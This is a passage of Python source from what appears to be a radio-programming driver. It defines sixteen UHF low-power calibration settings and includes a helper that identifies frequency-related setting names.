        rs = RadioSetting("uhf_low_pwr.s1", "Low <= Rng1 (Band start)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_low_pwr.s1, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_low_pwr.s2", "Low Rng2 (Band start + Spacing)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_low_pwr.s2, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_low_pwr.s3", "Low Rng3 (Band start + Spacing * 2)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_low_pwr.s3, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_low_pwr.s4", "Low Rng4 (Band start + Spacing * 3)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_low_pwr.s4, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_low_pwr.s5", "Low Rng5 (Band start + Spacing * 4)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_low_pwr.s5, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_low_pwr.s6", "Low Rng6 (Band start + Spacing * 5)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_low_pwr.s6, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_low_pwr.s7", "Low Rng7 (Band start + Spacing * 6)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_low_pwr.s7, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_low_pwr.s8", "Low Rng8 (Band start + Spacing * 7)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_low_pwr.s8, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_low_pwr.s9", "Low Rng9 (Band start + Spacing * 8)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_low_pwr.s9, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_low_pwr.s10", "Low Rng10 (Band start + Spacing * 9)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_low_pwr.s10, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_low_pwr.s11", "Low Rng11 (Band start + Spacing * 10)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_low_pwr.s11, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_low_pwr.s12", "Low Rng12 (Band start + Spacing * 11)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_low_pwr.s12, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_low_pwr.s13", "Low Rng13 (Band start + Spacing * 12)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_low_pwr.s13, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_low_pwr.s14", "Low Rng14 (Band start + Spacing * 13)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_low_pwr.s14, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_low_pwr.s15", "Low Rng15 (Band start + Spacing * 14)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_low_pwr.s15, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_low_pwr.s16", "Low >= Rng16 (Band start + Spacing * 15)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_low_pwr.s16, 1))
        upwr_grp.append(rs)

    def _is_freq(self, element):
        return "rxfreq" in element.get_name() \
                or "txoffset" in element.get_name() \
                or "rx_start" in element.get_name() \
                or "rx_stop" in element.get_name() \
                or "tx_start" in element.get_name() \
                or "tx_stop" in element.get_name() \
                or "freq_start" in element.get_name()